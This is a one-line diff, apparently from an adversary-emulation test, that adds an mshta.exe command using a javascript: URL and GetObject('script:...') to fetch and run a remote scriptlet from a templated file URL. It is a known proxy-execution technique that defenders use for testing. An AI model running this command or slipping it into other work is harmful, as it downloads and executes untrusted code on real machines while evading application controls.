@@ -1,0 +1,1 @@
+mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
